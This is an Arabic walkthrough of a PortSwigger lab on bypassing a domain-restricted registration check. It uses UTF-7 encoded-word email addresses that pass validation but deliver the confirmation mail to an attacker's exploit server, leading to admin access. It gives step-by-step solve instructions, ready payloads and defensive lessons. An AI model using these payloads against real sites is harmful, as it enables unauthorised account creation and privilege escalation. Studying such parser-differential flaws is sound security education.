# Lab : Bypassing access controls using email address parsing ;

https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-bypassing-access-controls-using-email-address-parsing-discrepancies

- الفكره من الLab ده

```bash
1. =?iso-8859-1?q?=61=62=63?=foo@ginandjuice.shop

2. attacker@exploit-0aee000603495e9082666ec901bf0025.exploit-server.net

3. =?utf-7?q?attacker&AEA-exploit-0aee000603495e9082666ec901bf0025.exploit-server.net&ACA-?=@ginandjuice.shop

4. =?utf-8?q?=61=62=63?=foo@ginandjuice.shop
```

اللاب ده من فئة **Business Logic Vulnerabilities**، وتحديدًا **Parser Discrepancy** (تناقض بين مكتبتين/طبقتين بيفسروا نفس البيانات بطريقة مختلفة). ده مبني على بحث حقيقي من فريق PortSwigger Research اسمه **"Splitting the Email Atom"**.

الفكرة الأساسية: التطبيق بيحاول يتأكد إن أي مستخدم بيسجل حساب **لازم يكون إيميله من دومين معين** (`ginandjuice.shop`). لكن فيه **مكتبتين مختلفتين** بيتعاملوا مع نفس عنوان الإيميل:

1. **مكتبة الـ Validation** (اللي بتتحقق من الدومين وقت التسجيل).
2. **مكتبة إرسال الإيميل** (اللي بتحدد فعليًا "لمين" هيتبعت إيميل التأكيد).

لو المكتبتين دول **بيفسروا نفس الـ string بطريقة مختلفة**، تقدر تصمم إيميل يبان لمكتبة الـ validation إنه من `ginandjuice.shop`، لكن مكتبة الإرسال فعليًا هتبعت الإيميل **لعنوان تاني بتتحكم فيه انت**.

### المفهوم التقني: Encoded-Word Standard

معيار **RFC 2047** (اسمه "encoded-word") بيسمح بتشفير أجزاء من عنوان الإيميل (زي الاسم أو حتى جزء من العنوان) باستخدام صيغة زي:

```
=?charset?encoding?encoded-text?=
```

مثال: `=?iso-8859-1?q?=61=62=63?=` معناها الحروف `abc` مُشفّرة بـ **Q-encoding** (زي Quoted-Printable) على ترميز **ISO-8859-1**.

المعيار ده مصمم أصلاً لدعم اللغات غير الإنجليزية في عناوين الإيميل، لكن المشكلة إن **مش كل مكتبة بتدعم كل أنواع الترميز (charsets) بنفس المستوى من الدقة أو الأمان**.

### خطوات الحل بالتفصيل

#### المرحلة 1: اكتشاف قيد التسجيل

1. افتح اللاب ودوس **Register**.
2. جرب تسجل بإيميل عادي من دومين مختلف:

```
   foo@exploit-server.net
```

1. هتلاقي رسالة رفض بتقول إن الدومين لازم يكون `ginandjuice.shop`. ده تأكيد إن فيه **فحص صريح على الدومين** وقت التسجيل.

#### المرحلة 2: اختبار ثغرات الترميز (Encoding Discrepancies)

#### محاولة 1: ISO-8859-1 encoded-word

```
=?iso-8859-1?q?=61=62=63?=foo@ginandjuice.shop
```

دي فعليًا بتعني `abcfoo@ginandjuice.shop` (الحروف `61 62 63` هما `a b c` بترميز hex). النتيجة: **مرفوض** برسالة "Registration blocked for security reasons" — يبقى السيرفر عنده **حماية بتكتشف** encoded-word syntax وترفضها كإجراء أمني.

#### محاولة 2: UTF-8 encoded-word

```
=?utf-8?q?=61=62=63?=foo@ginandjuice.shop
```

نفس النتيجة: **مرفوض**. يبقى الحماية دي بتغطي encoded-word **بشكل عام**، مش بس ISO-8859-1.

#### محاولة 3: UTF-7 encoded-word (الاختراق!)

```
=?utf-7?q?&AGEAYgBj-?=foo@ginandjuice.shop
```

**النتيجة: التسجيل عدى من غير أي رفض!** 🎯

ده بيكشف حاجة مهمة جدًا: **آلية الحماية (validation) بتفحص أنواع ترميز معينة وشائعة بس (زي UTF-8, ISO-8859-1)، لكن معندهاش وعي بترميز UTF-7** — رغم إن مكتبة **معالجة/إرسال الإيميل الفعلية** بتدعم UTF-7 وبتفسّره بشكل طبيعي.

#### المرحلة 3: استغلال الثغرة باستخدام UTF-7

الفكرة دلوقتي: نصمم إيميل بحيث:

- **مكتبة الـ validation** تشوف الـ string وتفتكر إنه بينتهي بـ `@ginandjuice.shop` (فتسمح بالتسجيل).
- **مكتبة إرسال الإيميل الفعلية** تفك تشفير الـ UTF-7 وتكتشف إن العنوان الحقيقي بيشاور على **سيرفرك انت** (exploit server).

الإيميل المستخدم:

```
=?utf-7?q?attacker&AEA-[YOUR-EXPLOIT-SERVER_ID]&ACA-?=@ginandjuice.shop
```

**فك الشفرة**:

- `&AEA-` في UTF-7 بيمثل الرمز **`@`**.
- `&ACA-` في UTF-7 بيمثل **مسافة (space)**.

يعني الجزء المُشفّر `attacker&AEA-[YOUR-EXPLOIT-SERVER_ID]&ACA-` لما يتفك، بيتحول لـ:

```
attacker@[YOUR-EXPLOIT-SERVER-ID]
```

(لاحظ الـ `@` والمسافة اللي ظهروا بعد فك التشفير)

يعني السلسلة الكاملة بعد فك التشفير هتبقى:

```
attacker@[YOUR-EXPLOIT-SERVER-ID] ?=@ginandjuice.shop
```

#### الحيلة الذكية هنا

مكتبة الـ **email parsing** الفعلية (اللي بتحدد "لمين نبعت الإيميل") بتفسّر الـ string بعد فك تشفير UTF-7، وبتاخد **أول عنوان إيميل صحيح تلاقيه** وهو:

```
attacker@[YOUR-EXPLOIT-SERVER-ID]
```

وبتتجاهل الباقي (اللي هو مجرد نص زيادة بعد المسافة، مش جزء من عنوان إيميل صحيح).

لكن مكتبة الـ **validation** بتبص على الـ **string الخام** (قبل فك التشفير الكامل، أو بمنطق مختلف)، وبتلاقي إن الـ string بينتهي فعليًا بـ `@ginandjuice.shop`، فبتسمح بيه.

#### خطوات التنفيذ العملي

1. سجل حساب بالإيميل ده (بعد ما تستبدل `[YOUR-EXPLOIT-SERVER_ID]` بالـ ID الحقيقي بتاع الـ exploit server بتاعك):

```
   =?utf-7?q?attacker&AEA-[YOUR-EXPLOIT-SERVER_ID]&ACA-?=@ginandjuice.shop
```

1. دوس **Email client** (من بانر اللاب)، هتلاقي **إيميل تأكيد التسجيل وصلك فعلاً** — ده تأكيد إن السيرفر فسّر العنوان صح كـ `attacker@[YOUR-EXPLOIT-SERVER-ID]` وبعته لسيرفرك انت، رغم إن آلية الـ validation "شافته" وكأنه من `ginandjuice.shop`.
2. دوس على **لينك التأكيد** في الإيميل عشان تفعّل الحساب.

#### المرحلة 4: الوصول لصلاحيات الأدمن

1. سجل دخول بالحساب اللي عملته.
2. دوس **Admin panel**، هتلاقي نفسك عندك وصول كامل لصفحة الأدمن (لأن حسابك اتسجل بإيميل "يبدو" إنه من `ginandjuice.shop`).
3. احذف `carlos`. اللاب هيتحل تلقائيًا ✅.

### ليه ده بيحصل تقنيًا

```
[Validation library] → بتفحص: "هل الـ string ده بينتهي بـ @ginandjuice.shop؟"
                        → مبتعرفش تفك تشفير UTF-7 encoded-word صح، أو بتفحص السلسلة الخام
                        → النتيجة: ✅ مسموح

[Email delivery library] → بتفك تشفير UTF-7 بالكامل
                            → بتلاقي: "attacker@[exploit-id] " + نص زيادة
                            → بتاخد أول عنوان صحيح: attacker@[exploit-id]
                            → بتبعت الإيميل لهناك فعليًا
```

المشكلة الجوهرية: **المكتبتين بيطبقوا معايير RFC مختلفة أو بمستويات دعم مختلفة لنفس المعيار (RFC 2047 encoded-word)**. مكتبة الـ validation دعمها لـ UTF-7 كان **غير موجود أو غير كافٍ**، بينما مكتبة الإرسال الفعلية كانت **بتدعمه بالكامل**، وده خلق **فجوة (gap)** بين "إيه اللي النظام يعتقد إنه بيحصل" و"إيه اللي بيحصل فعليًا".

### الدرس المستفاد

- **استخدام مكتبتين مختلفتين لتحليل (parse) نفس البيانات في مراحل مختلفة من نفس العملية خطر جسيم** — لازم تكون نفس المكتبة، أو على الأقل **نفس منطق التحليل بالظبط**، تُستخدم في كل مكان بيتعامل مع البيانات دي.
- **معايير الترميز القديمة أو الأقل شيوعًا (زي UTF-7) لسه مدعومة في مكتبات كتير لأسباب توافق قديمة (backward compatibility)**، وده بيفتح ثغرات لو مكتبة تانية في نفس النظام **متجاهلاها** في فحوصات الأمان بتاعتها.
- **الفحص الأمني (Validation) لازم يتم على البيانات "بعد" التطبيع الكامل (fully normalized/decoded)**، مش على الشكل الخام أو المشفّر جزئيًا — لأن أي طبقة تحقق بتفحص شكل مختلف عن الشكل اللي هيتفهم فعليًا في النهاية بتبقى عرضة للتحايل.
- هجمات **Parser Discrepancy** (أو **"Parser Differentials"**) فئة كاملة من الثغرات بتعتمد بالظبط على الفكرة دي: **استغلال الاختلاف في كيفية تفسير مكتبتين مختلفتين لنفس المدخل**، وده مبدأ ظهر في مجالات كتير غير الإيميل (زي HTTP request smuggling، وXML parsing attacks).
- الورقة البحثية المذكورة (**"Splitting the Email Atom"**) بتوضح إن معيار عنوان الإيميل (RFC 5322) نفسه **معقد جدًا ومليان حالات حدّية (edge cases)** يصعب على أي مكتبة واحدة تغطيها بشكل كامل ومتسق مع كل مكتبة تانية.
